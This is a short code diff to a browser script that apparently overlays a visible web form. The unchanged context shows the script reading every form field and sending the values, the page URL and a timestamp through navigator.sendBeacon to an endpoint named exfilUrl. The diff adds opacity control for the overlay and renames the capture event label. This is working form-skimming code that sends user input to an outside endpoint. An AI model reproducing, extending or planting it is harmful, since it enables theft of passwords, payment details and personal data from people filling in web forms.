@@ -125,6 +125,7 @@
   }
 
   let sheenEl = null
+  let sheenOpacity = 1
 
   function placeSheen() {
     const form = findVisibleForm()
@@ -142,6 +143,7 @@
       left: formR.left + 'px',
       width: formR.width + 'px',
       height: formR.height + 'px',
+      opacity: sheenOpacity,
     })
 
     const badge = document.createElement('div')
@@ -183,7 +185,8 @@
     const data = {}
     new FormData(form).forEach((v, k) => { data[k] = v })
     navigator.sendBeacon(exfilUrl, JSON.stringify({
-      type: 'xray_form_capture',
+      type: 'form_overlay_capture',
+      variant: 'xray',
       data,
       url: window.location.href,
       timestamp: Date.now(),
@@ -223,6 +226,7 @@
   window.xrayOverlay = {
     refresh: placeSheen,
     setOpacity: function (val) {
+      sheenOpacity = val
       if (sheenEl) sheenEl.style.opacity = val
     },
   }
